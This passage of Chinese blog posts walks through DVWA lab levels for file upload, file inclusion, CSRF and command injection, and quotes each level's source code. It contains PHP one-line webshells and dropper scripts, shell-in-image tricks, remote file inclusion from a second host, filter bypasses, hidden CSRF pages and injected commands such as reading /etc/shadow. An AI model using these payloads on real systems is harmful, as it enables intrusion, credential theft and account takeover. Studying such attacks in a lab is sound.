$uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! $html .= &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file $html .= &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt; 本难度对上传的文件类型和大小做了限制，只能上传大小小于100000B（约为97.6KB）的jpeg或png图片。由于一句话木马体积非常小，所以大小方面定然没有问题，文件类型虽然做了限制，但还是有很多种绕过方法： 1.直接修改上传文件的后缀 内容不变，将文件的后缀更改为.jpeg或.png，照样上传成功 但是此时用菜刀去连接却出了问题 地址：http://192.168.0.105/dvwa/hackable/uploads/muma.png 参数：muma 无论进行什么操作都会出现如下的提示 中国菜刀的原理是向上传文件发送包含muma参数的post请求，通过控制muma参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。 那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞（详见文件包含漏洞教程）。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，将菜刀的地址更改一下 地址：http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://tp://192.168.0.105/dvwa/hackable/uploads/muma.png 参数：muma 2.Burpsuit抓包修改文件类型和文件名 先明确一点，源代码中写文件内容和写文件名是两个步骤，我们上传的本地文件可以任意命名，只要在抓包之后将其修改为.php就可以，下面看一下例子 我们将刚才写的一句话木马命名为Whatever，并且清空上传目录下刚才上传的文件 现在上传这个文件，并且用Burpsuit抓包，看一下请求 修改圆圈中的两个地方，将文件名更改为Whatever_muma.php，将文件类型更改为image/png，发送请求看一下 可以看到已经上传成功，现在我们到文件夹看一下上传的文件命名为什么 果然如我们所料，文件名由在抓包的过程中修改的参数而决定，与文件本身文件名没有关系，现在菜刀直接连接 地址：http://192.168.0.105/dvwa/hackable/uploads/Whatever_muma.php 参数：muma 3.截断绕过规则 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为Whatever.php%00.png 上传文件并抓包，可以看到现在文件类型为image/png，可以通过文件类型检查 上传成功，并且此时服务器会认为其文件名为hack.php，顺势解析为php文件 Security Level — High核心代码 &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_tmp = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! $html .= &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file $html .= &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt; strrpos()函数：计算指定字符串在目标字符串中最后一次出现的位置（返回 needle 存在的位置。如果没有找到，返回 FALSE） strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int haystack：在此字符串中进行查找。 needle：如果 needle不是一个字符串，它将被转换为整型并被视为字符的顺序值。 offset：或许会查找字符串中任意长度的子字符串。负数值将导致查找在字符串结尾处开始的计数位置处结束。 getimagesize()函数：取得图像大小 getimagesize ( string $filename [, array &amp;$imageinfo ] ) : array 如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误（函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错） 从源码中可以看出来，对文件类型的判断不再使用$uploaded_type参数，而是直接使用$uploaded_name参数，所以本难度如果只修改请求头中的Content-Type就没用了 并且如果像上一个难度那样只把文件后缀改为.png，如果文件本身没有图片的文件头和结构，照样报错，所以也是不可行的 但是还是有方法的：通过copy命令，将一句话木马隐藏在图片里面 copy cartoon.png/b + shell.php/a muma.png shell.php的内容作用为写一个新的Webshell &lt;?php $file01 = fopen(&#39;lab01.php&#39;,&#39;w&#39;); $string = &#39;&lt;?php eval($_POST[pass]); ?&gt;&#39;; fputs($file01,$string); ?&gt; 合成新图片后用WinHex打开看一下，其实就是在图片末尾写上了代码，这也就可以自己手动写 用这个合成的图片去上传，果然可以上传成功。接下来就通过文件包含来访问并运行这个文件 http://192.168.0.105/DVWA/vulnerabilities/fi/?page=file:///C:/phpstudy/WWW/DVWA/hackable/uploads/muma.png 访问后出现编码，标识访问成功 查看文件夹，可以看到写入了一个shell，接下来就还是用菜刀去连接这个文件 连接成功 Security Level — Impossible核心代码 &lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file = md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! $html .= &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No $html .= &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file $html .= &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 该难度中增加了Anti-CSRF token验证，并且对上传的文件名进行了md5加密（无法使用%00截断绕过规则），然后用imagecreatefromjpeg()函数提取图片的关键标识点，再用imagejpeg()重建图像，所以我们插入隐身在图片中的内容会被过滤掉，所以上传者无法上传恶意的文件，杜绝了文件上传漏洞 参考文章： https://www.freebuf.com/articles/web/119467.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 4-File Inclusion（文件包含）","slug":"DVWA 4-File Inclusion（文件包含）","date":"2019-02-12T16:00:00.000Z","updated":"2019-09-11T02:04:45.539Z","comments":true,"path":"2019/02/13/DVWA 4-File Inclusion（文件包含）/","link":"","permalink":"https://knlvre.github.io/2019/02/13/DVWA 4-File Inclusion（文件包含）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\fi\\source\\ 页面功能直接点击file1.php、file2.php、file3.php可以相应跳转到不同的界面 开启allow_url_include进入之后如果allow_url_include没有开启，会出现如下画面 此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\\phpstudy\\php\\php-5.4.45\\php.ini 修改该配置文件中的allow_url_include = On，然后重启服务就可以了 Security Level — Low核心代码 &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; ?&gt; 从代码中可以看出来，对接受的page参数没有经过任何的处理，我们现在分别点击初始页面中的file1.php、file2.php、file3.php，发现URL中改变的只有page参数 既然page没有任何限制，现在就能读取其他文件，操作开始 1.本地文件包含 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=/etc/shadow 没有找到文件，那就说明这台服务器并不是Linux服务器 在服务器根目录下写一个test.php &lt;?php phpinfo(); ?&gt; 使用绝对路径访问test.php，访问成功 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=C:\\phpstudy\\www\\test.php 使用相对路径访问test.php，访问成功 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=../../../../../../phpstudy/www/test.php Ps：多个../是为了能够保证到达当下盘的根目录；斜杠和反斜杠都可以 2.远程文件包含 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行 直接试一下访问百度，直接访问成功 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://www.baidu.com 在另外一台远程主机上写入一个txt文件，内容为 &lt;?php $file = fopen(&#39;shell02.php&#39;,&#39;w&#39;); $string = &#39;&lt;?php eval($_POST[pass]); ?&gt;&#39;; fputs($file,$string); ?&gt; 现在就可以远程包含这个文件（我的远程主机IP为：192.168.43.84） 再去查看，已经生成了shell文件 菜刀成功连接 后续难度只要能绕过黑白名单的限制，就可以同上面方法一样去远程包含、生成shell、菜刀连接，不再赘述 Security Level — Medium核心代码 &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 从代码中可以看出来，利用str_replace()函数对http://、https://、../、..\\这4个重要的关键字符进行了过滤，但是绕过规则也比较简单，直接双写或者大小写就可以解决 虽然../无法绕过，但影响也不大，因为绝对路径还可以使用，试一下双写绕过，可以成功 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com 试一下大小写绕过，也可以成功 http://192.168.0.105/dvwa/vulnerabilities/fi/?page=HtTp://www.baidu.com Security Level — High核心代码 &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&#39;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 源码中可以看出来通过fnmatch()函数限制了输入的参数必须以file开头，但是我们还是可以绕过 1.file协议 因为使用浏览器打开一个本地文件时，使用的是file协议，刚好以file开头 file://C:/phpstudy/WWW/file.txt 现在构造URL http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/phpstudy/www/test.php 成功访问 Security Level — Impossible核心代码 &lt;?php // The page we wish to display $file = $_GET[ &#39;page&#39; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&#39;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; Impossible难度只允许include.php或者file{1..3}.php，虽然不灵活，但是却彻底杜绝文件包含漏洞 参考文章： https://www.freebuf.com/articles/web/119150.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）","slug":"DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）","date":"2019-02-11T16:00:00.000Z","updated":"2019-08-02T08:12:51.918Z","comments":true,"path":"2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/","link":"","permalink":"https://knlvre.github.io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\csrf\\source\\ 页面功能更改当前用户的密码 Security Level — Low核心代码 &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Get input $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 从源码可以看出来，对原密码($pass_conf)和新密码($pass_new)没有任何的过滤，只是简单地判断一下是否相等，如果相等，就更改当前用户的密码 我们先提交一次，来看一下结果 从抓取到的结果来看，修改密码的请求是通过GET方式发出的，那就意味着只要构造一个URL，并且让受害者点击访问，就可以更改受害者的账号密码，但是这种方式很明显，懂一些安全知识的人一眼就看出来了，甚至懂英语的就能看出来，所以是不可行的 那我们就还可以用一些比较隐蔽的方法，比如写一个HTML页面，代码如下 &lt;img src=&quot;http://192.168.0.105/dvwa/vulnerabilities/csrf/?password_new=999&amp;password_conf=999&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; Ps：style=&quot;display:none;&quot;是为了不让这个img元素显示出来，让受害者不知不觉地受到攻击；192.168.0.105是我环境的地址 写完之后访问一下 再次回到登录平台尝试原本的密码，登录失败，密码换成999才成功 Security Level — Medium核心代码 &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) { // Get input $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&#39;t come from a trusted source $html .= &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; stripos()函数：查找字符串首次出现的位置（不区分大小写） stripos ( string $haystack , string $needle [, int $offset = 0 ] ) : int haystack：在该字符串中查找。 needle：注意 needle 可以是一个单字符或者多字符的字符串。 如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 offset：可选的 offset 参数，从字符此数量的开始位置进行搜索。 如果是负数，就从字符末尾此数量的字符数开始统计。 要更改密码必须通过stripos()函数限制的条件，也就是$_SERVER[ &#39;HTTP_REFERER&#39; ]字段里面必须有$_SERVER[ &#39;SERVER_NAME&#39; ]，现在根目录下写一个简单的php页面来测试一下SERVER_NAME字段到底是什么，页面代码： &lt;?php echo $_SERVER[ &#39;SERVER_NAME&#39; ]; ?&gt; 我的环境是搭在虚拟机上，现在物理机访问一下这个页面可以看到返回的是192.168.0.105，正是我虚拟机的IP地址 再用虚拟机访问一下本地，分别用127.0.0.1和localhost 现在明白这个道理之后，更改一下之前写的file.html的文件名为192.168.0.105.html 现在假设攻击者（10.0.0.1）将这个恶意的html代码放在自己的服务器的attack目录下，所以此时被攻击者（192.168.0.105）点击的链接就是10.0.0.1/attack/192.168.0.105.html，点击之后，$_SERVER[ &#39;HTTP_REFERER&#39; ]=&quot;http://10.0.0.1/attack/192.168.0.105.html&quot;，$_SERVER[ &#39;SERVER_NAME&#39; ]=&quot;192.168.0.105&quot;，满足条件，直接修改密码 Security Level — High核心代码 &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 可以看到代码中已经加入了Anti-CSRF token的验证，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求 想要修改密码就需要拥有正确的token，如果像之前那样想诱导被攻击者者点击链接行不通了，因为现在的浏览器不允许跨域的请求，攻击脚本在攻击者服务器上，所以单单靠此时的攻击脚本想要获取受害者的token是不行的，就是因为不能跨域请求，所以行得通的就是将攻击脚本放在受害者的服务器上，点击然后获取token并提交修改密码。将以下代码写入受害者服务器中，保存为HTML，受害者访问时，密码将会被无声无息地更改为888 &lt;script type=&quot;text/javascript&quot;&gt; function attack(){ document.getElementsByName(&#39;user_token&#39;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#39;user_token&#39;)[0].value; document.getElementById(&quot;transfer&quot;).submit(); } &lt;/script&gt; &lt;iframe src=&quot;http://192.168.0.105/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt; &lt;/iframe&gt; &lt;body onload=&quot;attack()&quot;&gt; &lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.105/dvwa/vulnerabilities/csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;888&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;888&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/body&gt; 还有一种办法就是通过XSS获取token，然后就可以实现跨域的攻击 Security Level — Impossible核心代码 &lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_curr = $_GET[ &#39;password_current&#39; ]; $pass_new = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; ); $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在impossible难度中，直接需要输入原始密码才能更改密码，并且添加利用PDO技术防御SQL注入，而CSRF方面，如果不知道原始密码就全部无法更改密码了 参考文章： https://www.freebuf.com/articles/web/118352.html","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://knlvre.github.io/tags/DVWA/"}],"author":"Knlvre"},{"title":"DVWA 2-Command Injection（命令注入）","slug":"DVWA 2-Command Injection（命令注入）","date":"2019-02-10T16:00:00.000Z","updated":"2019-08-01T15:52:56.261Z","comments":true,"path":"2019/02/11/DVWA 2-Command Injection（命令注入）/","link":"","permalink":"https://knlvre.github.io/2019/02/11/DVWA 2-Command Injection（命令注入）/","excerpt":"","text":"源码位置DVWA\\vulnerabilities\\exec\\source\\ 页面功能可以在我们输入一个IP地址之后，帮我们Ping这个地址并返回结果 Security Level — Low核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr()函数：返回 haystack 字符串从 needle 第一次出现的位置开始到结尾的字符串。 stristr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string haystack:在该字符串中查找。 needle:如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 before_needle:若为 TRUE，strstr() 将返回 needle 在 haystack 中的位置之前的部分(不包括 needle)。 参数 needle 和 haystack 将以不区分大小写的方式对待。 php_uname()函数：返回了运行 PHP 的操作系统的描述。 这和 phpinfo() 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（built）时的操作系统名。 在一些旧的 UNIX 平台，它有可能无法检测到当前系统的信息，然后会还原显示成构建 PHP 时的系统信息。 这仅仅在你的 uname() 函数库不存在或无法运行时发生。 php_uname ([ string $mode = &quot;a&quot; ] ) : string mode：是单个字符，用于定义要返回什么信息： &#39;a&#39;：此为默认。包含序列 &quot;s n r v m&quot; 里的所有模式。 &#39;s&#39;：操作系统名称。例如： FreeBSD。 &#39;n&#39;：主机名。例如： localhost.example.com。 &#39;r&#39;：版本名称，例如： 5.1.2-RELEASE。 &#39;v&#39;：版本信息。操作系统之间有很大的不同。 &#39;m&#39;：机器类型。例如：i386。 可以看到，通过stristr()和php_uname()这两个函数判断操作系统的类型，不同类型执行不同的shell命令 Window和Linux系统都可以用&amp;&amp;来执行多条命令，比如 127.0.0.1 &amp;&amp; net user 可以看到，返回的信息分为两部分，分别是ping 127.0.0.1和net user的返回 Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大 Security Level — Medium核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping -c 4 &#39; . $target ); } // Feedback for the end user $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 从代码中可以看出来，对&amp;&amp;和;进行了过滤。 但是单个&amp;却还可以使用 127.0.0.1 &amp; net user 这里需要注意的是&amp;&amp;与&amp;的区别： Command 1 &amp;&amp; Command 2 先执行Command 1，执行成功后执行Command 2，否则不执行Command 2 Command 1 &amp; Command 2 先执行Command 1，不管是否成功，都会执行Command 2 本题还有一种绕过的方法，就是&amp;;&amp; 127.0.0.1 &amp;;&amp; net user Security Level — High核心代码 &lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39; =&gt; &#39;&#39;, &#39;| &#39; =&gt; &#39;&#39;, &#39;-&#39; =&gt; &#39;&#39;, 